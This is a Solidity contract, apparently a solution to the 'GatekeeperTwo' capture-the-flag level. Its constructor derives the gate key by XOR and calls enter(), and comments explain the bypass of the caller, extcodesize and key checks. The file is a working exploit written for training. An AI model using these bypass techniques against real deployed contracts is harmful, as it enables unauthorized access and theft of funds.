pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./GatekeeperTwo.sol";
import "hardhat/console.sol";

contract GatekeeperTwoAttacker {
  GatekeeperTwo target;

  constructor(address _target) public {
    target = GatekeeperTwo(_target);
    console.log("attack starts");

    uint64 left = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    uint64 right = uint64(0) - 1;
    uint64 key = left ^ right;
    bytes8(key);
    target.enter(bytes8(key));
    console.log("attack done");
  }
}

// Explanation: 
// gateOne: do the attack though a smartcontract.
// gateTwo: do the attack in the smartcontract constructor so that its code 
// still occupy zero memory space.
// gateThree: simply solve the equation : x ^ key = y <=> x ^ y = key
 
